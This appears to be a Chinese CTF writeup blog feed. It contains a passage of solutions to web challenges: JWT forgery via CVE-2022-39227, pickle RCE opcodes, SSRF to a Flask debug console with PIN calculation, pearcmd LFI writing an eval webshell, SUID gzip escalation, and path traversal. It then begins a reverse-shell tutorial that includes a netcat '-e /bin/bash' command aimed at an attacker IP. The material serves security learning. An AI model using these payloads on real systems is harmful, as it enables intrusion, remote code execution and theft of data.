src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240219181732813.png?lastModify=1715614296" alt="image-20240219181732813"></p><p>flag{95abea1a-063c-437a-89a1-cd7a88b65a38}</p><h3 id="Ye’s-Pickle"><a href="#Ye’s-Pickle" class="headerlink" title="Ye’s Pickle"></a>Ye’s Pickle</h3><p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240219183714079.png?lastModify=1715614296" alt="image-20240219183714079"></p><p>Pickle反序列化和jwt加密</p><p>Funweb的python_jwt的CVE-2022-39227</p><p>有token:</p><p>eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MDgzNDI3MzYsImlhdCI6MTcwODMzOTEzNiwianRpIjoibG81ZVJ4bzNtUFlEWldtNzNSTi1QQSIsIm5iZiI6MTcwODMzOTEzNiwicm9sZSI6Imd1ZXN0IiwidXNlcm5hbWUiOiJib29naXBvcCJ9.GhmLODYuwaap1dMW_moY0tk2fnTGOPzh1hIC6mqeTJQErgGcFLT9kcm-V8h-fRcmZzBAoDk_N02MYDa1S1f13xCdNviItCCi2bJTyG-a05rktpJ5O6Erj5A9TiHmZIU8vr5AJsKgsZ2MdDbQnr0R-cYTiuCQezKe37L0lEBdpT0P9F6HI4tnaXx8asXHb16HH8eavyat5oLLqDx_oqe4vIlOCiDOC4R0ZNz-ySNfoGSGlliOjKqRBNHUb_WyJF37qV5APRuq-qlQqFozzUabQfwFuQvYH0D-YDSEiHtpMuWLumUPCECKsHPs60LXW6_taoB4Cjp9R1sVIecnKjm1Zg</p><p>别人的脚本：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import base64</span><br><span class="line">from datetime import timedelta </span><br><span class="line">from json import loads, dumps </span><br><span class="line">from jwcrypto.common import base64url_decode, base64url_encode  </span><br><span class="line">def topic(topic):</span><br><span class="line">    &quot;&quot;&quot; Use mix of JSON and compact format to insert forged claims including long expiration &quot;&quot;&quot;</span><br><span class="line">    [header, payload, signature] = topic.split(&#x27;.&#x27;)</span><br><span class="line">    parsed_payload = loads(base64url_decode(payload))</span><br><span class="line">    parsed_payload[&#x27;role&#x27;] = &quot;admin&quot;</span><br><span class="line">    fake_payload = base64url_encode((dumps(parsed_payload, separators=(&#x27;,&#x27;, &#x27;:&#x27;))))</span><br><span class="line">    return &#x27;&#123;&quot;  &#x27; + header + &#x27;.&#x27; + fake_payload + &#x27;.&quot;:&quot;&quot;,&quot;protected&quot;:&quot;&#x27; + header + &#x27;&quot;, &quot;payload&quot;:&quot;&#x27; + payload + &#x27;&quot;,&quot;signature&quot;:&quot;&#x27; + signature + &#x27;&quot;&#125;&#x27;</span><br><span class="line">token = topic(&#x27;eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2OTc2ODkzNjQsImlhdCI6MTY5NzY4NTc2NCwianRpIjoiOTFvNVVqWXJPTUFmMmRYTVBaajFDUSIsIm5iZiI6MTY5NzY4NTc2NCwicm9sZSI6Imd1ZXN0IiwidXNlcm5hbWUiOiJib29naXBvcCJ9.jc3SP9ETBLURk3lRZZTPsgg-GQIuPpsIBkR710myDdFVy8e1PkVg7vbI4WTj8nnvh_ly9bD2sJJB3MSyXpTRj2ofPTitRjVWf9uZNjG1llWs21aHhjr9JUTPTPrYrQ0DpdvUUGudzV9raR5GSq28Qb_iLEQ4XIWKoGDtFNOvLeqcJcGotR1ygYAuPpTHaX2xidlzSYDbSbBGE55GI1zFS1w1PmsgliAyEJ1Z5IKz5qVZ07D6M-55L15cgWcaoQ9psjCyR4xX4A9GKPlYLwGxLVH0bRRkuyQn2l5JRBAzpMus7qY4srbLwF8XUPqKbje1vaUOt2DAsZA_SeAGw2iziQ&#x27;)</span><br><span class="line">print(token) opcode=b&#x27;&#x27;&#x27;cos</span><br><span class="line">system</span><br><span class="line">(S&#x27;&#x27; </span><br><span class="line">tRcos </span><br><span class="line">system </span><br><span class="line">(S&#x27;whoami&#x27; </span><br><span class="line">tR.&#x27;&#x27;&#x27; </span><br><span class="line">print(base64.b64encode(opcode))</span><br></pre></td></tr></table></figure><h3 id="pppython"><a href="#pppython" class="headerlink" title="pppython?"></a>pppython?</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">    </span><br><span class="line">    if ($_REQUEST[&#x27;hint&#x27;] == [&quot;your?&quot;, &quot;mine!&quot;, &quot;hint!!&quot;])&#123;</span><br><span class="line">        header(&quot;Content-type: text/plain&quot;);</span><br><span class="line">        system(&quot;ls / -la&quot;);</span><br><span class="line">        exit();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    try &#123;</span><br><span class="line">        $ch = curl_init();</span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $_REQUEST[&#x27;url&#x27;]);</span><br><span class="line">        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 60);</span><br><span class="line">        curl_setopt($ch, CURLOPT_HTTPHEADER, $_REQUEST[&#x27;lolita&#x27;]);</span><br><span class="line">        $output = curl_exec($ch);</span><br><span class="line">        echo $output;</span><br><span class="line">        curl_close($ch);   </span><br><span class="line">    &#125;catch (Error $x)&#123;</span><br><span class="line">        highlight_file(__FILE__);</span><br><span class="line">        highlight_string($x-&gt;getMessage());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">?&gt; curl_setopt(): The CURLOPT_HTTPHEADER option must have an array value </span><br></pre></td></tr></table></figure><p>curl?</p><p>?hint[0]&#x3D;your?&amp;hint[1]&#x3D;mine!&amp;hint[2]&#x3D;hint!!</p><p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240219185041884.png?lastModify=1715614296" alt="image-20240219185041884"></p><p>有flag文件 但是权限不够 还有一个app.py</p><p>用file协议去读取一下app.py的内容</p><p>?url&#x3D;file:&#x2F;&#x2F;&#x2F;app.py&amp;lolita[]&#x3D;0</p><p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240219185343796.png?lastModify=1715614296" alt="image-20240219185343796"></p><p>把它整理一下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from flask import Flask, request, session, render_template, render_template_string </span><br><span class="line">import os, base64 </span><br><span class="line">#from NeepuF1Le import neepu_files </span><br><span class="line">app = Flask(__name__) </span><br><span class="line">app.config[&#x27;SECRET_KEY&#x27;] = &#x27;******&#x27; </span><br><span class="line">@app.route(&#x27;/&#x27;) </span><br><span class="line">def welcome(): </span><br><span class="line">    if session[&quot;islogin&quot;] == True: </span><br><span class="line">        return &quot;flag&#123;***********************&#125;&quot; </span><br><span class="line">    app.run(&#x27;0.0.0.0&#x27;, 1314, debug=True)</span><br></pre></td></tr></table></figure><p>是一个开了debug的flask监听在1314端口</p><p>计算cookie值</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#sha1</span><br><span class="line">import hashlib</span><br><span class="line">import time</span><br><span class="line">from itertools import chain</span><br><span class="line">probably_public_bits = [    </span><br><span class="line">    &#x27;root&#x27;# /etc/passwd, /etc/shadow验证    </span><br><span class="line">    &#x27;flask.app&#x27;,# 默认值    </span><br><span class="line">    &#x27;Flask&#x27;,# 默认值    </span><br><span class="line">    &#x27;/usr/local/lib/python3.10/dist-packages/flask/app.py&#x27; # 报错得到]</span><br><span class="line">bid = &quot;8cab9c97-85be-4fb4-9d17-29335d7b2b8a&quot;</span><br><span class="line">did = &quot;12:hugetlb:/kubepods.slice/kubepods-burstable.slice/kubepods-burstable-pod9a6962f3_0518_44b9_b39d_99b5cbdcbde2.slice/docker-5393cbb4c79037280b98e5c09ab1df1a765d545afcde1166a1af321b068488e8.scope&quot;</span><br><span class="line">did = did.strip().rpartition(&quot;/&quot;)[2]</span><br><span class="line">print(did)</span><br><span class="line">private_bits = [</span><br><span class="line">    &#x27;46292774133529&#x27;,#  /sys/class/net/eth0/address 16进制转10进制 </span><br><span class="line">    #machine_id由三个合并(docker就后两个)：1. /etc/machine-id2./proc/sys/kernel/random/boot_id 3./proc/self/cgroup</span><br><span class="line">    bid+did#  /proc/sys/kernel/random/boot_id</span><br><span class="line">]</span><br><span class="line">h = hashlib.sha1()</span><br><span class="line">for bit in chain(probably_public_bits, private_bits):</span><br><span class="line">    if not bit:</span><br><span class="line">        continue</span><br><span class="line">    if isinstance(bit, str):</span><br><span class="line">        bit = bit.encode(&#x27;utf-8&#x27;)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(b&#x27;cookiesalt&#x27;)</span><br><span class="line">    </span><br><span class="line">cookie_name = &#x27;__wzd&#x27; + h.hexdigest()[:20]</span><br><span class="line"></span><br><span class="line">num = None</span><br><span class="line">if num is None:</span><br><span class="line">    h.update(b&#x27;pinsalt&#x27;)</span><br><span class="line">    num = (&#x27;%09d&#x27; % int(h.hexdigest(), 16))[:9]</span><br><span class="line">rv =None</span><br><span class="line">if rv is None:</span><br><span class="line">    for group_size in 5, 4, 3:</span><br><span class="line">        if len(num) % group_size == 0:</span><br><span class="line">           rv = &#x27;-&#x27;.join(num[x:x + group_size].rjust(group_size, &#x27;0&#x27;)</span><br><span class="line">                         for x in range(0, len(num), group_size))</span><br><span class="line">           break</span><br><span class="line">    else:</span><br><span class="line">        rv = num</span><br><span class="line">def hash_pin(pin: str) -&gt; str:</span><br><span class="line">    return hashlib.sha1(f&quot;&#123;pin&#125; added salt&quot;.encode(&quot;utf-8&quot;, &quot;replace&quot;)).hexdigest()[:12]</span><br><span class="line">print(rv)</span><br><span class="line">print(cookie_name + &quot;=&quot; + f&quot;&#123;int(time.time())&#125;|&#123;hash_pin(rv)&#125;&quot;)</span><br><span class="line">    #890KUjqCgmGiRRNLpH8a</span><br><span class="line">    #http://localhost:1314/console?&amp;__debugger__=yes&amp;cmd=__import__(&quot;os&quot;).popen(&quot;ps&quot;).read()&amp;frm=0&amp;s=890KUjqCgmGiRRNLpH8a</span><br></pre></td></tr></table></figure><p>结果：__wzd3d910b5d784ac96048c1&#x3D;1702047018|3fe90e7adf4c</p><p>所以：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?lolita[]=Cookie:__wzd3d910b5d784ac96048c1=1702047018|3fe90e7adf4c &amp;url=http://127.0.0.1:1314/console? &amp;__debugger__=yes&amp;pin=200-001-804 &amp;cmd=__import__(&quot;os&quot;).popen(&quot;ls&quot;).read() &amp;frm=0 &amp;s=lrLipQkNez3cZzDYShlU</span><br></pre></td></tr></table></figure><p>但是：需要对&amp;和空格进行url编码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /?lolita[]=Cookie:__wzd3d910b5d784ac96048c1=1702047018|3fe90e7adf4c&amp;url=http://127.0.0.1:1314/console?%26__debugger__=yes%26pin=200-001-804%26cmd=__import__(&quot;os&quot;).popen(&quot;cat%2B/flag&quot;).read()%26frm=0%26s=lrLipQkNez3cZzDYShlU</span><br></pre></td></tr></table></figure><p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240219191152178.png?lastModify=1715614296" alt="image-20240219191152178"></p><h3 id="4-复盘"><a href="#4-复盘" class="headerlink" title="4-复盘"></a>4-复盘</h3><p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240219191409098.png?lastModify=1715614296" alt="image-20240219191409098"></p><p>根据前面的misc题可以拿到源码，其中关键代码如下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> &lt;?php         </span><br><span class="line">if (isset($_GET[&#x27;page&#x27;])) &#123;          </span><br><span class="line">    $page =&#x27;pages/&#x27; .$_GET[&#x27;page&#x27;].&#x27;.php&#x27;;        </span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;          </span><br><span class="line">    $page = &#x27;pages/dashboard.php&#x27;;        </span><br><span class="line">&#125;        </span><br><span class="line">if (file_exists($page)) &#123;          </span><br><span class="line">    require_once $page;         </span><br><span class="line">&#125;</span><br><span class="line">else&#123;          </span><br><span class="line">    require_once &#x27;pages/error_page.php&#x27;;        </span><br><span class="line">&#125; ?&gt;</span><br></pre></td></tr></table></figure><p>存在很明显的文件包含漏洞，与week3类似，包含pearcmd.php即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /index.php?+config-create+/&amp;page=/../../../../../usr/local/lib/php/pearcmd&amp;/&lt;?=@eval($_POST[1])?&gt;+/var/www/html/1.php</span><br></pre></td></tr></table></figure><p>写入Shell后就是一个SUID提权</p><p>find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null</p><p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240219191557322.png?lastModify=1715614296" alt="image-20240219191557322"></p><p>gzip命令有SUID权限</p><p>gzip -f &#x2F;flag -t</p><p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240219191705176.png?lastModify=1715614296" alt="image-20240219191705176"></p><p>flag{sample_flag}</p><h3 id="NextDrive"><a href="#NextDrive" class="headerlink" title="NextDrive"></a>NextDrive</h3><p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240219191939079.png?lastModify=1715614296" alt="image-20240219191939079"></p><p>提示：</p><p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240219191955015.png?lastModify=1715614296" alt="image-20240219191955015"></p><p>随便注册一个账号，把公共资源区的文件都下下来看看，发现这个文件中有蹊跷</p><p>test.res.http</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">content-type: application/json; charset=utf-8</span><br><span class="line">content-length: 50</span><br><span class="line">date: Tue, 06 Oct 2023 13:39:21 GMT</span><br><span class="line">connection: keep-alive</span><br><span class="line">keep-alive: timeout=5</span><br><span class="line"></span><br><span class="line">&#123;&quot;code&quot;:0,&quot;msg&quot;:&quot;success&quot;,&quot;logged&quot;:true,&quot;data&quot;:[&#123;&quot;name&quot;:&quot;すずめ feat.十明 - RADWIMPS,十明.flac&quot;,&quot;hash&quot;:&quot;5da3818f2b481c261749c7e1e4042d4e545c1676752d6f209f2e7f4b0b5fd0cc&quot;,&quot;size&quot;:27471829,&quot;uploader&quot;:&quot;admin&quot;,&quot;uploader_uid&quot;:&quot;100000&quot;,&quot;shareTime&quot;:1708341555726,&quot;isYours&quot;:true,&quot;isOwn&quot;:true,&quot;ownFn&quot;:&quot;すずめ feat.十明 - RADWIMPS,十明.flac&quot;&#125;,&#123;&quot;name&quot;:&quot;Windows 12 Concept.png&quot;,&quot;hash&quot;:&quot;469db0f38ca0c07c3c8726c516e0f967fa662bfb6944a19cf4c617b1aba78900&quot;,&quot;size&quot;:440707,&quot;uploader&quot;:&quot;admin&quot;,&quot;uploader_uid&quot;:&quot;100000&quot;,&quot;shareTime&quot;:1708341557215,&quot;isYours&quot;:true,&quot;isOwn&quot;:true,&quot;ownFn&quot;:&quot;Windows 12 Concept.png&quot;&#125;,&#123;&quot;name&quot;:&quot;信息安全技术信息安全事件分类分级指南.pdf&quot;,&quot;hash&quot;:&quot;03dff115bc0d6907752796fc808fe2ef0b4ea9049b5a92859fd7017d4e96c08f&quot;,&quot;size&quot;:330767,&quot;uploader&quot;:&quot;admin&quot;,&quot;uploader_uid&quot;:&quot;100000&quot;,&quot;shareTime&quot;:1708341557290,&quot;isYours&quot;:true,&quot;isOwn&quot;:true,&quot;ownFn&quot;:&quot;信息安全技术信息安全事件分类分级指南.pdf&quot;&#125;,&#123;&quot;name&quot;:&quot;不限速，就是快！.jpg&quot;,&quot;hash&quot;:&quot;2de8696b9047f5cf270f77f4f00756be985ebc4783f3c553a77c20756bc68f2e&quot;,&quot;size&quot;:32920,&quot;uploader&quot;:&quot;admin&quot;,&quot;uploader_uid&quot;:&quot;100000&quot;,&quot;shareTime&quot;:1708341557304,&quot;isYours&quot;:true,&quot;isOwn&quot;:true,&quot;ownFn&quot;:&quot;不限速，就是快！.jpg&quot;&#125;,&#123;&quot;name&quot;:&quot;test.req.http&quot;,&quot;hash&quot;:&quot;83a065c4db184a69d902a6e5cd56fa43ccb6dc6d0eaee7ae92ebd31ae983e0b4&quot;,&quot;size&quot;:1085,&quot;uploader&quot;:&quot;admin&quot;,&quot;uploader_uid&quot;:&quot;100000&quot;,&quot;shareTime&quot;:1708341559212,&quot;isYours&quot;:true,&quot;isOwn&quot;:true,&quot;ownFn&quot;:&quot;test.req.http&quot;&#125;]&#125;</span><br></pre></td></tr></table></figure><p>这个文件叫test.req.http 与test.res.http不同 可能有信息泄露</p><p>发现在我的资源区可以上传文件，先随便上传一个文件，抓包看看</p><p>一共抓到两个包，后一个就是上传文件的请求，前一个check包中应该进行了检测，可以看到我们请求的数据只有hash值和文件名，应该就是根据文件名和hash值来检测的，前文我们已经有了test.req.http的hash值，直接改包上传即可</p><p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240219192834401.png?lastModify=1715614296" alt="image-20240219192834401"></p><p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240219192917184.png?lastModify=1715614296" alt="image-20240219192917184"></p><p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240219193247047.png?lastModify=1715614296" alt="image-20240219193247047"></p><p>这时候就能看到资源区出现了1.txt，打开可以看到应该是一个分享文件的请求，发现其中的cookie和我们的不一样，猜测应该是admin对应的cookie</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /api/info/drive/sharezone HTTP/1.1</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Length: 0</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Cookie: uid=100000; token=eyJ1c2VybmFtZSI6ImFkbWluIiwidWlkIjoiMTAwMDAwIiwidG9rZW4iOiIyMTBjZmQ2NTkyZWM0ZjRjMmMzYjljZTY3ZDExNDVmZmQxNWM5MjZlNjI3YmMwYjU2MGUxMmUxNmI2Yjg0ZDg0In0uXh5BcmMxSFBCZV41LSAhLw.XW5QWmdTHl1HLAZLck9MAgs7BQk3ABQKFCoHGSNNTAUPOVgLYldIDRYvUBR3GUwCCTlWDWcBSl0TfwYfdU0aAl1pAQFnABgAEXcFHnAWTgcIOlVbMQAeXUJ4BkghT01RC2hVD2RXHgBHL1MbcRhNXAw+AV1jW0oKR35SG38YS10</span><br><span class="line">Host: localhost:21920</span><br><span class="line">Origin: http://localhost:21920</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Referer: http://localhost:21920/sharezone</span><br><span class="line">Sec-Fetch-Dest: empty</span><br><span class="line">Sec-Fetch-Mode: cors</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0</span><br><span class="line">sec-ch-ua: &quot;Microsoft Edge&quot;;v=&quot;119&quot;, &quot;Chromium&quot;;v=&quot;119&quot;, &quot;Not?A_Brand&quot;;v=&quot;24&quot;</span><br><span class="line">sec-ch-ua-mobile: ?0</span><br><span class="line">sec-ch-ua-platform: &quot;Windows&quot;</span><br></pre></td></tr></table></figure><p>将uid和token修改成上面的内容，发现我们的账号变成了admin。</p><p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240219193427513.png?lastModify=1715614296" alt="image-20240219193427513"></p><p>自己的资源区中有个share.js文件，下载下来看看</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">const Router = require(&quot;koa-router&quot;);</span><br><span class="line">const router = new Router();</span><br><span class="line">const CONFIG = require(&quot;../../runtime.config.json&quot;);</span><br><span class="line">const Res = require(&quot;../../components/utils/response&quot;);</span><br><span class="line">const FileSignUtil = require(&quot;../../components/utils/file-signature&quot;);</span><br><span class="line">const &#123; DriveUtil &#125; = require(&quot;../../components/utils/database.utilities&quot;);</span><br><span class="line">const fs = require(&quot;fs&quot;);</span><br><span class="line">const path = require(&quot;path&quot;);</span><br><span class="line">const &#123; verifySession &#125; = require(&quot;../../components/utils/session&quot;);</span><br><span class="line">const logger = global.logger;</span><br><span class="line"> </span><br><span class="line">/**</span><br><span class="line"> * @deprecated</span><br><span class="line"> * ! FIXME: 发现漏洞，请进行修改</span><br><span class="line"> */</span><br><span class="line">router.get(&quot;/s/:hashfn&quot;, async (ctx, next) =&gt; &#123;</span><br><span class="line">    const hash_fn = String(ctx.params.hashfn || &#x27;&#x27;)</span><br><span class="line">    const hash = hash_fn.slice(0, 64)</span><br><span class="line">    const from_uid = ctx.query.from_uid</span><br><span class="line">    const custom_fn = ctx.query.fn</span><br><span class="line"> </span><br><span class="line">    // 参数校验</span><br><span class="line">    if (typeof hash_fn !== &quot;string&quot; || typeof from_uid !== &quot;string&quot;) &#123;</span><br><span class="line">        // invalid params or query</span><br><span class="line">        ctx.set(&quot;X-Error-Reason&quot;, &quot;Invalid Params&quot;);</span><br><span class="line">        ctx.status = 400; // Bad Request</span><br><span class="line">        return ctx.res.end();</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    // 是否为共享的文件</span><br><span class="line">    let IS_FILE_EXIST = await DriveUtil.isShareFileExist(hash, from_uid)</span><br><span class="line">    if (!IS_FILE_EXIST) &#123;</span><br><span class="line">        ctx.set(&quot;X-Error-Reason&quot;, &quot;File Not Found&quot;);</span><br><span class="line">        ctx.status = 404; // Not Found</span><br><span class="line">        return ctx.res.end();</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    // 系统中是否存储有该文件</span><br><span class="line">    let IS_FILE_EXIST_IN_STORAGE</span><br><span class="line">    try &#123;</span><br><span class="line">        IS_FILE_EXIST_IN_STORAGE = fs.existsSync(path.resolve(CONFIG.storage_path, hash_fn))</span><br><span class="line">    &#125; catch (e) &#123;</span><br><span class="line">        ctx.set(&quot;X-Error-Reason&quot;, &quot;Internal Server Error&quot;);</span><br><span class="line">        ctx.status = 500; // Internal Server Error</span><br><span class="line">        return ctx.res.end();</span><br><span class="line">    &#125;</span><br><span class="line">    if (!IS_FILE_EXIST_IN_STORAGE) &#123;</span><br><span class="line">        logger.error(`File $&#123;hash_fn.yellow&#125; not found in storage, but exist in database!`)</span><br><span class="line">        ctx.set(&quot;X-Error-Reason&quot;, &quot;Internal Server Error&quot;);</span><br><span class="line">        ctx.status = 500; // Internal Server Error</span><br><span class="line">        return ctx.res.end();</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    // 文件名处理</span><br><span class="line">    let filename = typeof custom_fn === &quot;string&quot; ? custom_fn : (await DriveUtil.getFilename(from_uid, hash));</span><br><span class="line">    filename = filename.replace(/[\\\/\:\*\&quot;\&#x27;\&lt;\&gt;\|\?\x00-\x1F\x7F]/gi, &quot;_&quot;)</span><br><span class="line"> </span><br><span class="line">    // 发送</span><br><span class="line">    ctx.set(&quot;Content-Disposition&quot;, `attachment; filename*=UTF-8&#x27;&#x27;$&#123;encodeURIComponent(filename)&#125;`);</span><br><span class="line">    // ctx.body = fs.createReadStream(path.resolve(CONFIG.storage_path, hash_fn))</span><br><span class="line">    await ctx.sendFile(path.resolve(CONFIG.storage_path, hash_fn)).catch(e =&gt; &#123;</span><br><span class="line">        logger.error(`Error while sending file $&#123;hash_fn.yellow&#125;`)</span><br><span class="line">        logger.error(e)</span><br><span class="line">        ctx.status = 500; // Internal Server Error</span><br><span class="line">        return ctx.res.end();</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"> </span><br><span class="line">module.exports = router;</span><br></pre></td></tr></table></figure><p>&#x2F;s&#x2F;后的内容为hashfn的值，其中前64位作为hash，请求中的参数from_uid的值作为const from_uid的值，用于后续验证文件是否可共享，是否存在于系统。在通过两个检测后，就会发给客服端，其中对于文件名基本没有过滤，我们通过..&#x2F;穿越目录访问环境变量即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">router.get(&quot;/s/:hashfn&quot;, async (ctx, next) =&gt; &#123;</span><br><span class="line">    const hash_fn = String(ctx.params.hashfn || &#x27;&#x27;)</span><br><span class="line">    const hash = hash_fn.slice(0, 64)</span><br><span class="line">    const from_uid = ctx.query.from_uid</span><br><span class="line">    const custom_fn = ctx.query.fn</span><br></pre></td></tr></table></figure><p>inux下的环境变量位于&#x2F;proc&#x2F;self&#x2F;environ</p><p>最后的payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl http://node4.buuoj.cn:29720/s/469db0f38ca0c07c3c8726c516e0f967fa662bfb6944a19cf4c617b1aba78900/../../../../proc/self/environ?from_uid=100000 -o 1.txt</span><br></pre></td></tr></table></figure><p> 然后看1.txt文件即可</p><p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240219193601631.png?lastModify=1715614296" alt="image-20240219193601631"></p><p>结束了 终于写完了 这week5要写吐了 好难好难好难</p><p>接下来就是先把java和反序列化的课看完 然后再补补misc</p><p>QAQ</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>反弹shell</title>
      <link href="/2024/05/13/%E5%8F%8D%E5%BC%B9shell/"/>
      <url>/2024/05/13/%E5%8F%8D%E5%BC%B9shell/</url>
      
        <content type="html"><![CDATA[<h1 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h1><h2 id="前置"><a href="#前置" class="headerlink" title="前置"></a>前置</h2><p>什么是反弹shell：<br>反弹shell，就是攻击机监听在某个TCP&#x2F;UDP端口为服务端，目标机主动发起请求到攻击机监听的端口，并将其命令行的输入输出转到攻击机。</p><p>正向连接：<br>假设我们攻击了一台机器，打开了该机器的一个端口，攻击者在自己的机器去连接目标机器（目标ip：目标机器端口），这是比较常规的形式，我们叫做正向连接。远程桌面、web服务、ssh、telnet等等都是正向连接。</p><p>什么情况下需要用到反弹shell：<br>大致有如下几种情况：</p><blockquote><p>由于防火墙等限制，对方机器只能发送请求，不能接收请求。<br>拿到了目标机器的远程执行命令权限，为操作方便想要在本机拿到 shell 。<br>目标机位于局域网，直接连接不了。<br>目标机器的ip动态改变，你不能持续控制。<br>对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机等情况都是未知的，所以建立一个服务端让恶意程序主动连接，才是上策</p></blockquote><p>对于以上几种情况，我们是无法利用正向连接的，要用反向连接。</p><p>反弹 shell 的方式有很多，那具体要用哪种方式还需要根据目标主机的环境来确定，比如目标主机上如果安装有 netcat，那我们就可以利用 netcat 反弹 shell，如果有python环境，可以利用 python 反弹。如果具有 php 环境也同理。</p><h2 id="netcat监听反弹shell"><a href="#netcat监听反弹shell" class="headerlink" title="netcat监听反弹shell"></a>netcat监听反弹shell</h2><p>Netcat 是一款简单的Unix工具，使用UDP和TCP协议。 它是一个可靠的容易被其他程序所启用的后台操作工具，同时它也被用作网络的测试工具或黑客工具。 使用它你可以轻易的建立任何连接。</p><p>目前，默认的各个linux发行版本已经自带了netcat工具包，但是可能由于处于安全考虑原生版本的netcat带有可以直接发布与反弹本地shell的功能参数 -e 都被阉割了，所以我们需要自己手动下载二进制安装包，安装的如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget https://nchc.dl.sourceforge.net/project/netcat/netcat/0.7.1/netcat-0.7.1.tar.gz</span><br><span class="line">tar -xvzf netcat-0.7.1.tar.gz</span><br><span class="line">./configure</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line">make clean</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">wget下载获取网站目录下资源</span><br><span class="line"></span><br><span class="line">./ 执行文件</span><br><span class="line"></span><br><span class="line">make</span><br><span class="line">根据Makefile文件编译源代码、连接、生成目标文件、可执行文件。</span><br><span class="line"></span><br><span class="line">make install</span><br><span class="line">将编译成功的可执行文件安装到系统目录中，一般为usr/local/bin目录。</span><br><span class="line"></span><br><span class="line">make clean</span><br><span class="line">清除上次的make命令所产生的object文件（后缀为“.o”的文件）及可执行文件。</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/6641a9b056296.png" alt="image-20240406005137907"></p><p>NC常用参数介绍：</p><blockquote><p>-l：侦听模式，即使没有接收到数据包，也会一直保持连接状态。</p><p>-p：指定本地端口号。如果未指定，则nc将随机选择一个空闲的端口。</p><p>-v：提供更详细的输出信息，例如打印出nc建立的连接和传输的数据。使用vv获取更详细的信息。</p><p>-e：指定要在连接建立后执行的命令。</p><p>-n：不执行DNS解析，使用IP地址连接。</p><p>-u：使用UDP协议而不是默认的TCP协议。</p><p>-w：设置超时时间。如果在指定的时间内没有连接或数据传输，则nc将退出。</p><p>-z：仅扫描目标主机的端口，不进行数据传</p></blockquote><p>监听：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netcat -lvvp 监听端口号</span><br><span class="line">nc -lvvn 监听端口号</span><br><span class="line">nc -lvnp 监听端口号</span><br><span class="line"></span><br><span class="line">#几个一样的</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/6641a9af30cf2.png" alt="image-20240406005714273"></p><p>主动连接（nc的反弹shell）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netcat 192.xxx.xxx.1 2333 -e /bin/bash</span><br><span class="line"># nc &lt;攻击机IP&gt; &lt;攻击机监听的端口&gt; -e /bin/bash</span><br><span 